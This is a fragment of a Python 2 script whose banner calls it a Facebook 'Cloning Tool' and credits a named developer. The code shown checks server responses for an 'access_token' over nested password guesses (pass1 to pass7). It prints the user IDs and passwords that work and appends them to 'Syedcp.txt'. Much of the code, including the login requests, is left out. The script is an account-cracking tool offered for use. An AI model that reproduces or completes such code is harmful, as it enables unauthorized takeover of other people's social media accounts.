...
logo =      '\x1b[1;91m _|_|_|_|_|                    \n\x1b[1;91m     _|      _|_|    _|  _|_|  \n\x1b[1;92m     _|    _|    _|  _|_|      \n\x1b[1;92m     _|    _|    _|  _|        \n\x1b[1;91m     _|      _|_|    _|        \n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : TOOR AJMALO\x1b[1;33m\xf0\x9f\x94\xa5NAZIR\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m FB  : facebook.com/NaZerkhaN521\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/NazirkHan45\n\x1b[1;93m______________________________________________________\n'
def tool():
    os.system('clear')
    print ''
    print logo
...
def main_select():
    ...
    if SYED == '':
        ...
        os.system('xdg-open https://www.facebook.com/UsmanXsameer3445')
        main()
    elif SYED == '0':
        os.system('exit')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;93m[NAZIR] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
